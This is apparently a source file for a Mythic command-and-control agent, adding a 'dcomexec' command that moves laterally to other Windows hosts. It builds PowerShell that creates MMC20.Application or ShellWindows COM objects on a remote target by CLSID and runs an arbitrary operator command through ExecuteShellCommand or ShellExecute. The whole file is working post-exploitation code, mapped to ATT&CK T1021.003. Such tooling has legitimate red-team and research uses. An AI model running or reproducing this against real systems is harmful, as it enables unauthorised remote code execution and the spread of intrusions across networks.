from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class DcomExecuteArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                cli_name="command",
                display_name="Command",
                type=ParameterType.String,
                description="Full command line to execute on the target via DCOM.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="host",
                cli_name="host",
                display_name="Host",
                type=ParameterType.String,
                description="Remote host. If empty, execute locally.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="method",
                cli_name="method",
                display_name="DCOM Method",
                type=ParameterType.String,
                description="DCOM object to use: mmc20 (MMC20.Application) or shellwindows (ShellWindows). Default: mmc20.",
                default_value="mmc20",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require JSON blob, but got empty command line.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)


class DcomExecuteCommand(CommandBase):
    cmd = "dcomexec"
    needs_admin = False
    help_cmd = "dcomexec -command <cmd> [-host <host>] [-method mmc20|shellwindows]"
    description = "Script-only DCOM lateral execution wrapper (MMC20.Application or ShellWindows) via PowerShell."
    version = 1
    author = "@Lavender-exe"
    argument_class = DcomExecuteArguments
    attackmapping = ["T1021.003"]
    script_only = True
    attributes = CommandAttributes(suggested_command=True, dependencies=["powerchell"])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

        command = taskData.args.get_arg("command") or ""
        host = taskData.args.get_arg("host") or ""
        method = (taskData.args.get_arg("method") or "mmc20").lower().strip()

        display_params = f"-command {command}"
        if host:
            display_params += f" -host {host}"
        display_params += f" -method {method}"
        response.DisplayParams = display_params

        # Escape single quotes inside command/host for embedding in PowerShell single-quoted strings
        escaped_cmd = command.replace("'", "''")
        target = f"'{host}'" if host else "'127.0.0.1'"

        if method == "shellwindows":
            ps_block = (
                f"$c = [activator]::CreateInstance([type]::GetTypeFromCLSID("
                f"'9BA05972-F6A8-11CF-A442-00A0C90A8F39', {target}));"
                f"$item = $c.Item();"
                f"$item.Document.Application.ShellExecute('{escaped_cmd}', $null, $null, $null, 0)"
            )
        else:
            # MMC20.Application (default)
            ps_block = (
                f"$c = [activator]::CreateInstance([type]::GetTypeFromCLSID("
                f"'49B2791A-B1AE-4C90-9B8E-E860BA07F889', {target}));"
                f"$c.Document.ActiveView.ExecuteShellCommand('{escaped_cmd}', $null, $null, '7')"
            )

        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                CommandName="powerchell",
                Params=json.dumps({"powershell_params": ps_block}),
            )
        )

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
